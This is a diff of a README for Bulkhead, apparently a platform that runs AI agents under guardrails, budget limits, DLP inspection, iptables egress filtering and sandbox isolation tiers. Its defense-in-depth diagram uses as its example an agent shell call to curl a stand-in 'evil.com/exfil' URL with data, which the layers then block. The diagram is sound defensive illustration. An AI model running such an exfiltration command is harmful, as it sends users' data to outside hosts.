@@ -3,7 +3,52 @@
 [![CI](https://github.com/Baselyne-Systems/bulkhead/actions/workflows/ci.yml/badge.svg)](https://github.com/Baselyne-Systems/bulkhead/actions/workflows/ci.yml)
 [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/Baselyne-Systems/bulkhead)
 
-Bulkhead is an enterprise platform for deploying autonomous AI agents safely. It provides sandboxed execution environments with real-time guardrails evaluation, human-in-the-loop escalation, budget enforcement, and a complete audit trail — giving organizations the control they need to run AI agents in production.
+**Bulkhead is an enterprise platform for running autonomous AI agents in production with enforced policy controls.**
+
+AI agents that can browse the web, execute code, and call APIs need more than a prompt — they need guardrails that can't be bypassed, budgets that can't be exceeded, network boundaries that can't be circumvented, and an audit trail that can't be tampered with. Bulkhead provides all four as independent enforcement layers, so a failure in one doesn't compromise the others.
+
+## Defense in Depth
+
+Every tool call an agent makes passes through four independent enforcement layers before it can take effect:
+
+```
+Agent calls ExecuteTool("shell", {"cmd": "curl https://evil.com/exfil?data=..."})
+
+    1. Guardrails ── Compiled policy evaluated in Rust (<50ms)
+       │              Tool "shell" matched rule "deny-shell" → DENY
+       │              (if allowed, continues to next layer)
+       │
+    2. Budget ────── Per-agent spending limit checked before execution
+       │              $47.20 of $100.00 used → ALLOW
+       │
+    3. DLP ────────── Content classified for sensitive data patterns
+       │              SSN detected in parameters → DENY
+       │              (blocks data exfiltration even if guardrails allow the tool)
+       │
+    4. Egress ────── iptables rules at the kernel level
+                      evil.com not in allowlist → DROPPED
+                      (even if all policy layers pass, network is filtered independently)
+```
+
+The Host Agent is **policy-only** — it evaluates and returns a verdict (ALLOW / DENY / ESCALATE) but never executes agent code. Agents run inside sandboxed containers and execute tools locally. This separation means a compromised agent cannot influence its own policy evaluation.
+
+## Isolation Tiers
+
+Sandbox security is automatically selected based on agent trust level and data sensitivity, or overridden explicitly by operators:
+
+| Tier | Security Profile | When Used |
+|------|-----------------|-----------|
+| **Standard** | Docker container (cgroups + namespaces) | Trusted agents, public data |
+| **Hardened** | + seccomp profile, read-only rootfs, no-new-privileges, dropped capabilities | New/untrusted agents, confidential data |
+| **Isolated** | + gVisor or Kata runtime (kernel-level isolation) | High-risk agents, restricted data |
+
+Auto-selection matrix:
+
+| Trust \ Data | Public | Internal | Confidential | Restricted |
+|-------------|--------|----------|--------------|------------|
+| Trusted | standard | standard | standard | isolated |
+| Established | standard | standard | hardened | isolated |
+| New | hardened | hardened | isolated | isolated |
 
 ## Architecture
 
@@ -51,29 +96,31 @@ graph TB
     Egress --- Sandbox
 ```
 
-The **control plane** (Go) handles orchestration, persistence, policy management, and host fleet management. The **Host Agent** (Rust) runs on each host — it self-registers with the Compute Plane on startup, sends periodic heartbeats with resource availability, and manages sandboxed containers with configurable isolation tiers (standard, hardened, isolated). It evaluates guardrails and budget as a policy engine while agents execute tools inside their containers.
+| Component | Technology | Role |
+|-----------|-----------|------|
+| **Control Plane** | Go 1.24, gRPC, PostgreSQL 16 | 9 microservices: orchestration, policy management, fleet management, audit |
+| **Host Agent** | Rust 1.83, Tokio, Bollard | Per-host policy engine: guardrails evaluation, Docker lifecycle, iptables egress |
+| **Python SDK** | Python 3.10+, LangChain | `@tool` decorator: evaluate-execute-report cycle, LangChain wrapper |
 
-## Key Features
+## Key Capabilities
 
-- **Sandboxed Execution** — Each agent runs in an isolated Docker container with configurable isolation tiers (standard, hardened with seccomp + read-only rootfs, or isolated with gVisor/Kata runtime), resource limits, allowed tool lists, and environment variable injection
-- **Egress Allowlist** — Per-sandbox network egress control via iptables. Approved destinations pass; all other outbound traffic is dropped at the kernel level
-- **Policy-Only Host Agent** — Evaluates guardrails and budget, returns a verdict (ALLOW/DENY/ESCALATE). Agents execute tools locally inside their container
-- **Real-Time Guardrails** — Every tool call evaluated in <50ms against compiled policy rules
-- **Human-in-the-Loop** — Non-blocking approval/question/escalation requests with configurable delivery channels and timeout policies
-- **Budget Enforcement** — Per-agent budgets checked before every tool execution
-- **Append-Only Audit Trail** — Every action recorded immutably with full context and latency metrics
-- **Python SDK** — `@tool` decorator handles the evaluate-execute-report cycle transparently. Integrates with LangChain
-- **Credential Brokering** — Scoped, time-limited credentials with SHA-256 token hashing
-- **Compute Placement** — Hosts self-register and send heartbeats every 30s; stale hosts are automatically marked offline. Best-fit placement with atomic resource reservation and isolation-tier-aware filtering
-- **Isolation Tier Auto-Selection** — Automatic selection of sandbox isolation tier (standard/hardened/isolated) based on agent trust level and data classification
+**Security & Compliance**
+- **Real-time guardrails** — Compiled policy rules evaluated in Rust, targeting <50ms per decision. Hot-reload without sandbox restart.
+- **Per-sandbox egress control** — iptables FORWARD chain rules enforce network allowlists at the kernel level. Unapproved destinations are silently dropped.
+- **DLP egress inspection** — Content classification detects SSNs, credit cards, AWS keys, and other sensitive patterns before data leaves the sandbox.
+- **Append-only audit trail** — Every action (allowed, denied, escalated) recorded immutably with tool name, parameters, verdict, matched rule, and latency metrics.
+- **Scoped credentials** — Time-limited tokens (max 24h) with explicit permission scopes. SHA-256 hashed for storage.
 
-## Choose Your Guide
+**Operations**
+- **Human-in-the-loop** — Non-blocking approval/question/escalation requests. Configurable delivery channels (webhook-based) and timeout policies.
+- **Budget enforcement** — Per-agent spending limits checked before every tool execution. Configurable actions on exceeded: halt, request increase, or warn.
+- **Compute fleet management** — Hosts self-register and heartbeat every 30s. Best-fit placement with `FOR UPDATE SKIP LOCKED` prevents resource overselling. Warm pool pre-reserves slots for instant placement.
+- **Behavior analysis** — Considered evaluation tier detects anomalies: high denial rates, stuck agents, runaway loops. Configurable alerts with webhook delivery.
 
-| I want to... | Guide |
-|--------------|-------|
-| Deploy the platform, configure guardrails, create tasks via gRPC | [Operator Guide](docs/getting-started/operator-guide.md) |
-| Build an agent with the Python SDK (`@tool` decorator) | [Agent Developer Guide](docs/getting-started/agent-guide.md) |
-| Integrate Bulkhead guardrails into a LangChain agent | [LangChain Integration Guide](docs/getting-started/langchain-guide.md) |
+**Developer Experience**
+- **Python SDK** — `@tool` decorator handles the full evaluate-execute-report cycle. `wrap_langchain_tool()` brings existing LangChain agents to Bulkhead with one line.
+- **Full orchestration** — Create a task, and the platform handles placement, policy compilation, credential injection, and sandbox creation automatically.
+- **OpenTelemetry** — Distributed tracing across all services via Jaeger.
 
 ## Quick Start
 
@@ -91,6 +138,14 @@ docker compose -f deploy/docker-compose.yml up --build
 docker compose -f deploy/docker-compose.yml ps
 ```
 
+## Choose Your Guide
+
+| I want to... | Guide |
+|--------------|-------|
+| Deploy the platform, configure guardrails, create tasks via gRPC | [Operator Guide](docs/getting-started/operator-guide.md) |
+| Build an agent with the Python SDK (`@tool` decorator) | [Agent Developer Guide](docs/getting-started/agent-guide.md) |
+| Integrate Bulkhead guardrails into a LangChain agent | [LangChain Integration Guide](docs/getting-started/langchain-guide.md) |
+
 ## Project Structure
 
 ```
@@ -99,11 +154,11 @@ bulkhead/
 │   └── platform/
 │       ├── identity/v1/            #   Agent registry, credentials
 │       ├── workspace/v1/           #   Workspace lifecycle
-│       ├── host_agent/v1/           #   Host Agent gRPC services
-│       ├── compute/v1/             #   Host fleet, placement
+│       ├── host_agent/v1/          #   Host Agent gRPC services
+│       ├── compute/v1/             #   Host fleet, placement, warm pool
 │       ├── guardrails/v1/          #   Rule CRUD, policy compilation
 │       ├── human/v1/               #   Human interaction requests
-│       ├── activity/v1/            #   Action records
+│       ├── activity/v1/            #   Action records, alerts
 │       ├── economics/v1/           #   Usage metering, budgets
 │       ├── governance/v1/          #   Data classification, DLP
 │       └── task/v1/                #   Task lifecycle
@@ -111,7 +166,7 @@ bulkhead/
 ├── control-plane/                  # Go microservices (9 services)
 │   ├── cmd/                        #   Service entry points
 │   ├── internal/                   #   Business logic per service
-│   └── migrations/                 #   SQL schema migrations
+│   └── migrations/                 #   SQL schema migrations (13 files)
 │
 ├── runtime/                        # Host Agent (Rust)
 │   └── crates/
@@ -132,6 +187,7 @@ bulkhead/
 │
 ├── deploy/
 │   ├── docker-compose.yml          # Full stack (11 containers)
+│   ├── helm/                       # Kubernetes Helm chart
 │   └── docker/
 │       ├── Dockerfile.control-plane
 │       └── Dockerfile.host-agent
